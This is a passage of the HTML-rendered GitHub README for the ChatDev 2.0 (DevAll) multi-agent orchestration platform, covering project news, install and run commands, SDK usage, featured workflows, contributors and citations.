 &lt;li&gt;&lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;&lt;strong&gt;ChatDev 1.0 (Legacy)&lt;/strong&gt;&lt;/a&gt; operates as a &lt;strong&gt;Virtual Software Company&lt;/strong&gt;. It utilizes various intelligent agents (e.g., CEO, CTO, Programmer) participating in specialized functional seminars to automate the entire software development life cycle‚Äîincluding designing, coding, testing, and documenting. It serves as the foundational paradigm for communicative agent collaboration.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;üéâ News&lt;/h2&gt; 
&lt;p&gt;‚Ä¢ &lt;strong&gt;Jan 07, 2026: üöÄ We are excited to announce the official release of ChatDev 2.0 (DevAll)!&lt;/strong&gt; This version introduces a zero-code multi-agent orchestration platform. The classic ChatDev (v1.x) has been moved to the &lt;a href="https://github.com/OpenBMB/ChatDev/tree/chatdev1.0"&gt;&lt;code&gt;chatdev1.0&lt;/code&gt;&lt;/a&gt; branch for maintenance. More details about ChatDev 2.0 can be found on &lt;a href="https://x.com/OpenBMB/status/2008916790399701335"&gt;our official post&lt;/a&gt;.&lt;/p&gt; 
&lt;details&gt; 
 &lt;summary&gt;Old News&lt;/summary&gt; 
 &lt;p&gt;‚Ä¢Sep 24, 2025: üéâ Our paper &lt;a href="https://arxiv.org/abs/2505.19591"&gt;Multi-Agent Collaboration via Evolving Orchestration&lt;/a&gt; has been accepted to NeurIPS 2025. The implementation is available in the &lt;code&gt;puppeteer&lt;/code&gt; branch of this repository.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢May 26, 2025: üéâ We propose a novel puppeteer-style paradigm for multi-agent collaboration among large language model based agents. By leveraging a learnable central orchestrator optimized with reinforcement learning, our method dynamically activates and sequences agents to construct efficient, context-aware reasoning paths. This approach not only improves reasoning quality but also reduces computational costs, enabling scalable and adaptable multi-agent cooperation in complex tasks. See our paper in &lt;a href="https://arxiv.org/abs/2505.19591"&gt;Multi-Agent Collaboration via Evolving Orchestration&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/puppeteer.png" width="800" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢June 25, 2024: üéâTo foster development in LLM-powered multi-agent collaborationü§ñü§ñ and related fields, the ChatDev team has curated a collection of seminal papersüìÑ presented in a &lt;a href="https://github.com/OpenBMB/ChatDev/tree/main/MultiAgentEbook"&gt;open-source&lt;/a&gt; interactive e-booküìö format. Now you can explore the latest advancements on the &lt;a href="https://thinkwee.top/multiagent_ebook"&gt;Ebook Website&lt;/a&gt; and download the &lt;a href="https://github.com/OpenBMB/ChatDev/raw/main/MultiAgentEbook/papers.csv"&gt;paper list&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ebook.png" width="800" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢June 12, 2024: We introduced Multi-Agent Collaboration Networks (MacNet) üéâ, which utilize directed acyclic graphs to facilitate effective task-oriented collaboration among agents through linguistic interactions ü§ñü§ñ. MacNet supports co-operation across various topologies and among more than a thousand agents without exceeding context limits. More versatile and scalable, MacNet can be considered as a more advanced version of ChatDev's chain-shaped topology. Our preprint paper is available at &lt;a href="https://arxiv.org/abs/2406.07155"&gt;https://arxiv.org/abs/2406.07155&lt;/a&gt;. This technique has been incorporated into the &lt;a href="https://github.com/OpenBMB/ChatDev/tree/macnet"&gt;macnet&lt;/a&gt; branch, enhancing support for diverse organizational structures and offering richer solutions beyond software development (e.g., logical reasoning, data analysis, story generation, and more).&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/macnet.png" width="500" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ May 07, 2024, we introduced "Iterative Experience Refinement" (IER), a novel method where instructor and assistant agents enhance shortcut-oriented experiences to efficiently adapt to new tasks. This approach encompasses experience acquisition, utilization, propagation and elimination across a series of tasks and making the pricess shorter and efficient. Our preprint paper is available at &lt;a href="https://arxiv.org/abs/2405.04219"&gt;https://arxiv.org/abs/2405.04219&lt;/a&gt;, and this technique will soon be incorporated into ChatDev.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ier.png" width="220" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ January 25, 2024: We have integrated Experiential Co-Learning Module into ChatDev. Please see the &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#co-tracking"&gt;Experiential Co-Learning Guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ December 28, 2023: We present Experiential Co-Learning, an innovative approach where instructor and assistant agents accumulate shortcut-oriented experiences to effectively solve new tasks, reducing repetitive errors and enhancing efficiency. Check out our preprint paper at &lt;a href="https://arxiv.org/abs/2312.17025"&gt;https://arxiv.org/abs/2312.17025&lt;/a&gt; and this technique will soon be integrated into ChatDev.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/ecl.png" width="860" /&gt; &lt;/p&gt; ‚Ä¢ November 15, 2023: We launched ChatDev as a SaaS platform that enables software developers and innovative entrepreneurs to build software efficiently at a very low cost and remove the barrier to entry. Try it out at https://chatdev.modelbest.cn/. 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/saas.png" width="560" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ November 2, 2023: ChatDev is now supported with a new feature: incremental development, which allows agents to develop upon existing codes. Try &lt;code&gt;--config "incremental" --path "[source_code_directory_path]"&lt;/code&gt; to start it.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/increment.png" width="700" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ October 26, 2023: ChatDev is now supported with Docker for safe execution (thanks to contribution from &lt;a href="https://github.com/ManindraDeMel"&gt;ManindraDeMel&lt;/a&gt;). Please see &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#docker-start"&gt;Docker Start Guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/docker.png" width="400" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 25, 2023: The &lt;strong&gt;Git&lt;/strong&gt; mode is now available, enabling the programmer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/programmer.png" height="20" /&gt; to utilize Git for version control. To enable this feature, simply set &lt;code&gt;"git_management"&lt;/code&gt; to &lt;code&gt;"True"&lt;/code&gt; in &lt;code&gt;ChatChainConfig.json&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#git-mode"&gt;guide&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/github.png" width="600" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 20, 2023: The &lt;strong&gt;Human-Agent-Interaction&lt;/strong&gt; mode is now available! You can get involved with the ChatDev team by playing the role of reviewer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/reviewer.png" height="20" /&gt; and making suggestions to the programmer &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/programmer.png" height="20" /&gt;; try &lt;code&gt;python3 run.py --task [description_of_your_idea] --config "Human"&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#human-agent-interaction"&gt;guide&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/WareHouse/Gomoku_HumanAgentInteraction_20230920135038"&gt;example&lt;/a&gt;.&lt;/p&gt; 
 &lt;p align="center"&gt; &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/Human_intro.png" width="600" /&gt; &lt;/p&gt; 
 &lt;p&gt;‚Ä¢ September 1, 2023: The &lt;strong&gt;Art&lt;/strong&gt; mode is available now! You can activate the designer agent &lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/visualizer/static/figures/designer.png" height="20" /&gt; to generate images used in the software; try &lt;code&gt;python3 run.py --task [description_of_your_idea] --config "Art"&lt;/code&gt;. See &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/wiki.md#art"&gt;guide&lt;/a&gt; and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/WareHouse/gomokugameArtExample_THUNLP_20230831122822"&gt;example&lt;/a&gt;.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ August 28, 2023: The system is publicly available.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ August 17, 2023: The v1.0.0 version was ready for release.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ July 30, 2023: Users can customize ChatChain, Phasea and Role settings. Additionally, both online Log mode and replay mode are now supported.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ July 16, 2023: The &lt;a href="https://arxiv.org/abs/2307.07924"&gt;preprint paper&lt;/a&gt; associated with this project was published.&lt;/p&gt; 
 &lt;p&gt;‚Ä¢ June 30, 2023: The initial version of the ChatDev repository was released.&lt;/p&gt; 
&lt;/details&gt; 
&lt;h2&gt;üöÄ Quick Start&lt;/h2&gt; 
&lt;h3&gt;üìã Prerequisites&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;OS&lt;/strong&gt;: macOS / Linux / WSL / Windows&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Python&lt;/strong&gt;: 3.12+&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Node.js&lt;/strong&gt;: 18+&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Package Manager&lt;/strong&gt;: &lt;a href="https://docs.astral.sh/uv/"&gt;uv&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üì¶ Installation&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Backend Dependencies&lt;/strong&gt; (Python managed by &lt;code&gt;uv&lt;/code&gt;):&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;uv sync
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Frontend Dependencies&lt;/strong&gt; (Vite + Vue 3):&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd frontend &amp;amp;&amp;amp; npm install
&lt;/code&gt;&lt;/pre&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;‚ö°Ô∏è Run the Application&lt;/h3&gt; 
&lt;ol&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Start Backend&lt;/strong&gt; :&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;# Run from the project root
uv run python server_main.py --port 6400 --reload
&lt;/code&gt;&lt;/pre&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;Remove &lt;code&gt;--reload&lt;/code&gt; if output files (e.g., GameDev) trigger restarts, which interrupts tasks and loses progress.&lt;/p&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
 &lt;li&gt; &lt;p&gt;&lt;strong&gt;Start Frontend&lt;/strong&gt;:&lt;/p&gt; &lt;pre&gt;&lt;code class="language-bash"&gt;cd frontend
VITE_API_BASE_URL=http://localhost:6400 npm run dev
&lt;/code&gt;&lt;/pre&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;Then access the Web Console at &lt;strong&gt;&lt;a href="http://localhost:5173"&gt;http://localhost:5173&lt;/a&gt;&lt;/strong&gt;.&lt;/p&gt; 
  &lt;/blockquote&gt; 
  &lt;blockquote&gt; 
   &lt;p&gt;&lt;strong&gt;üí° Tip&lt;/strong&gt;: If the frontend fails to connect to the backend, the default port &lt;code&gt;6400&lt;/code&gt; may already be occupied. Please switch both services to an available port, for example:&lt;/p&gt; 
   &lt;ul&gt; 
    &lt;li&gt;&lt;strong&gt;Backend&lt;/strong&gt;: start with &lt;code&gt;--port 6401&lt;/code&gt;&lt;/li&gt; 
    &lt;li&gt;&lt;strong&gt;Frontend&lt;/strong&gt;: set &lt;code&gt;VITE_API_BASE_URL=http://localhost:6401&lt;/code&gt;&lt;/li&gt; 
   &lt;/ul&gt; 
  &lt;/blockquote&gt; &lt;/li&gt; 
&lt;/ol&gt; 
&lt;h3&gt;üîë Configuration&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Environment Variables&lt;/strong&gt;: Create a &lt;code&gt;.env&lt;/code&gt; file in the project root.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Model Keys&lt;/strong&gt;: Set &lt;code&gt;API_KEY&lt;/code&gt; and &lt;code&gt;BASE_URL&lt;/code&gt; in &lt;code&gt;.env&lt;/code&gt; for your LLM provider.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;YAML placeholders&lt;/strong&gt;: Use &lt;code&gt;${VAR}&lt;/code&gt;Ôºàe.g., &lt;code&gt;${API_KEY}&lt;/code&gt;Ôºâin configuration files to reference these variables.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üí° How to Use&lt;/h2&gt; 
&lt;h3&gt;üñ•Ô∏è Web Console&lt;/h3&gt; 
&lt;p&gt;The DevAll interface provides a seamless experience for both construction and execution&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Tutorial&lt;/strong&gt;: Comprehensive step-by-step guides and documentation integrated directly into the platform to help you get started quickly.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/tutorial-en.png" /&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Workflow&lt;/strong&gt;: A visual canvas to design your multi-agent systems. Configure node parameters, define context flows, and orchestrate complex agent interactions with drag-and-drop ease.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/workflow.gif" /&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Launch&lt;/strong&gt;: Initiate workflows, monitor real-time logs, inspect intermediate artifacts, and provide human-in-the-loop feedback.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/launch.gif" /&gt; 
&lt;h3&gt;üß∞ Python SDK&lt;/h3&gt; 
&lt;p&gt;For automation and batch processing, use our lightweight Python SDK to execute workflows programmatically and retrieve results directly.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-python"&gt;from runtime.sdk import run_workflow

# Execute a workflow and get the final node message
result = run_workflow(
    yaml_file="yaml_instance/demo.yaml",
    task_prompt="Summarize the attached document in one sentence.",
    attachments=["/path/to/document.pdf"],
    variables={"API_KEY": "sk-xxxx"} # Override .env variables if needed
)

if result.final_message:
    print(f"Output: {result.final_message.text_content()}")
&lt;/code&gt;&lt;/pre&gt; 
&lt;hr /&gt; 
&lt;p&gt;&lt;a id="developers"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;‚öôÔ∏è For Developers&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;For secondary development and extensions, please proceed with this section.&lt;/strong&gt;&lt;/p&gt; 
&lt;p&gt;Extend DevAll with new nodes, providers, and tools. The project is organized into a modular structure:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Core Systems&lt;/strong&gt;: &lt;code&gt;server/&lt;/code&gt; hosts the FastAPI backend, while &lt;code&gt;runtime/&lt;/code&gt; manages agent abstraction and tool execution.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Orchestration&lt;/strong&gt;: &lt;code&gt;workflow/&lt;/code&gt; handles the multi-agent logic, driven by configurations in &lt;code&gt;entity/&lt;/code&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Frontend&lt;/strong&gt;: &lt;code&gt;frontend/&lt;/code&gt; contains the Vue 3 Web Console.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Extensibility&lt;/strong&gt;: &lt;code&gt;functions/&lt;/code&gt; is the place for custom Python tools.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Relevant reference documentation:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Getting Started&lt;/strong&gt;: &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/index.md"&gt;Start Guide&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Core Modules&lt;/strong&gt;: &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/workflow_authoring.md"&gt;Workflow Authoring&lt;/a&gt;, &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/modules/memory.md"&gt;Memory&lt;/a&gt;, and &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/docs/user_guide/en/modules/tooling/index.md"&gt;Tooling&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h2&gt;üåü Featured Workflows&lt;/h2&gt; 
&lt;p&gt;We provide robust, out-of-the-box templates for common scenarios. All runnable workflow configs are located in &lt;code&gt;yaml_instance/&lt;/code&gt;.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;Demos&lt;/strong&gt;: Files named &lt;code&gt;demo_*.yaml&lt;/code&gt; showcase specific features or modules.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Implementations&lt;/strong&gt;: Files named directly (e.g., &lt;code&gt;ChatDev_v1.yaml&lt;/code&gt;) are full in-house or recreated workflows. As follows:&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üìã Workflow Collection&lt;/h3&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="left"&gt;Category&lt;/th&gt; 
   &lt;th align="left"&gt;Workflow&lt;/th&gt; 
   &lt;th align="left"&gt;Case&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üìà Data Visualization&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;data_visualization_basic.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;data_visualization_enhanced.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/data_analysis/data_analysis.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Create 4‚Äì6 high-quality PNG charts for my large real-estate transactions dataset."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üõ†Ô∏è 3D Generation&lt;/strong&gt;&lt;br /&gt;&lt;em&gt;(Requires &lt;a href="https://www.blender.org/"&gt;Blender&lt;/a&gt; &amp;amp; &lt;a href="https://github.com/ahujasid/blender-mcp"&gt;blender-mcp&lt;/a&gt;)&lt;/em&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;blender_3d_builder_simple.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;blender_3d_builder_hub.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;blender_scientific_illustration.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/3d_generation/3d.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Please build a Christmas tree."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üéÆ Game Dev&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;GameDev_v1.yaml&lt;/code&gt;&lt;br /&gt;&lt;code&gt;ChatDev_v1.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/game_development/game.gif" width="100%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Please help me design and develop a Tank Battle game."&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üìö Deep Research&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;deep_research_v1.yaml&lt;/code&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/deep_research/deep_research.gif" width="85%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"Research about recent advances in the field of LLM-based agent RL"&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;üéì Teach Video&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;code&gt;teach_video.yaml&lt;/code&gt; (Please run command &lt;code&gt;uv add manim&lt;/code&gt; before running this workflow)&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/cases/video_generation/video.gif" width="140%" /&gt;&lt;br /&gt;Prompt: &lt;em&gt;"ËÆ≤‰∏Ä‰∏ã‰ªÄ‰πàÊòØÂá∏‰ºòÂåñ"&lt;/em&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;hr /&gt; 
&lt;h3&gt;üí° Usage Guide&lt;/h3&gt; 
&lt;p&gt;For those implementations, you can use the &lt;strong&gt;Launch&lt;/strong&gt; tab to execute them.&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;&lt;strong&gt;Select&lt;/strong&gt;: Choose a workflow in the &lt;strong&gt;Launch&lt;/strong&gt; tab.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Upload&lt;/strong&gt;: Upload necessary files (e.g., &lt;code&gt;.csv&lt;/code&gt; for data analysis) if required.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Prompt&lt;/strong&gt;: Enter your request (e.g., &lt;em&gt;"Visualize the sales trends"&lt;/em&gt; or &lt;em&gt;"Design a snake game"&lt;/em&gt;).&lt;/li&gt; 
&lt;/ol&gt; 
&lt;hr /&gt; 
&lt;h2&gt;ü§ù Contributing&lt;/h2&gt; 
&lt;p&gt;We welcome contributions from the community! Whether you're fixing bugs, adding new workflow templates, or sharing high-quality cases/artifacts produced by DevAll, your help is much appreciated. Feel free to contribute by submitting &lt;strong&gt;Issues&lt;/strong&gt; or &lt;strong&gt;Pull Requests&lt;/strong&gt;.&lt;/p&gt; 
&lt;p&gt;By contributing to DevAll, you'll be recognized in our &lt;strong&gt;Contributors&lt;/strong&gt; list below. Check out our &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/#developers"&gt;Developer Guide&lt;/a&gt; to get started!&lt;/p&gt; 
&lt;h3&gt;üë• Contributors&lt;/h3&gt; 
&lt;h4&gt;Primary Contributors&lt;/h4&gt; 
&lt;table&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/NA-Wen"&gt;&lt;img src="https://github.com/NA-Wen.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;NA-Wen&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/zxrys"&gt;&lt;img src="https://github.com/zxrys.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;zxrys&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/swugi"&gt;&lt;img src="https://github.com/swugi.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;swugi&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/huatl98"&gt;&lt;img src="https://github.com/huatl98.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;huatl98&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h4&gt;Contributors&lt;/h4&gt; 
&lt;table&gt; 
 &lt;tbody&gt;
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/shiowen"&gt;&lt;img src="https://github.com/shiowen.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;shiowen&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/kilo2127"&gt;&lt;img src="https://github.com/kilo2127.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;kilo2127&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;a href="https://github.com/AckerlyLau"&gt;&lt;img src="https://github.com/AckerlyLau.png?size=100" width="64px;" alt="" /&gt;&lt;br /&gt;&lt;sub&gt;&lt;b&gt;AckerlyLau&lt;/b&gt;&lt;/sub&gt;&lt;/a&gt;&lt;/td&gt; 
  &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt; 
&lt;h2&gt;ü§ù Acknowledgments&lt;/h2&gt; 
&lt;p&gt;&lt;a href="http://nlp.csai.tsinghua.edu.cn/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/thunlp.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://modelbest.cn/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/modelbest.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://github.com/OpenBMB/AgentVerse/"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/agentverse.png" height="50pt" /&gt;&lt;/a&gt;&amp;nbsp;&amp;nbsp; &lt;a href="https://github.com/OpenBMB/RepoAgent"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/repoagent.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://app.commanddash.io/agent?github=https://github.com/OpenBMB/ChatDev"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/CommandDash.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/www.teachmaster.cn"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/teachmaster.png" height="50pt" /&gt;&lt;/a&gt; &lt;a href="https://github.com/OpenBMB/AppCopilot"&gt;&lt;img src="https://raw.githubusercontent.com/OpenBMB/ChatDev/main/assets/appcopilot.png" height="50pt" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;üîé Citation&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;@article{chatdev,
    title = {ChatDev: Communicative Agents for Software Development},
    author = {Chen Qian and Wei Liu and Hongzhang Liu and Nuo Chen and Yufan Dang and Jiahao Li and Cheng Yang and Weize Chen and Yusheng Su and Xin Cong and Juyuan Xu and Dahai Li and Zhiyuan Liu and Maosong Sun},
    journal = {arXiv preprint arXiv:2307.07924},
    url = {https://arxiv.org/abs/2307.07924},
    year = {2023}
}

@article{colearning,
    title = {Experiential Co-Learning of Software-Developing Agents},
    author = {Chen Qian and Yufan Dang and Jiahao Li and Wei Liu and Zihao Xie and Yifei Wang and Weize Chen and Cheng Yang and Xin Cong and Xiaoyin Che and Zhiyuan Liu and Maosong Sun},
    journal = {arXiv preprint arXiv:2312.17025},
    url = {https://arxiv.org/abs/2312.17025},
    year = {2023}
}

@article{macnet,
    title={Scaling Large-Language-Model-based Multi-Agent Collaboration},
    author={Chen Qian and Zihao Xie and Yifei Wang and Wei Liu and Yufan Dang and Zhuoyun Du and Weize Chen and Cheng Yang and Zhiyuan Liu and Maosong Sun}
    journal={arXiv preprint arXiv:2406.07155},
    url = {https://arxiv.org/abs/2406.07155},
    year={2024}
}

@article{iagents,
    title={Autonomous Agents for Collaborative Task under Information Asymmetry},
    author={Wei Liu and Chenxi Wang and Yifei Wang and Zihao Xie and Rennai Qiu and Yufan Dnag and Zhuoyun Du and Weize Chen and Cheng Yang and Chen Qian},
    journal={arXiv preprint arXiv:2406.14928},
    url = {https://arxiv.org/abs/2406.14928},
    year={2024}
}

@article{puppeteer,
      title={Multi-Agent Collaboration via Evolving Orchestration}, 
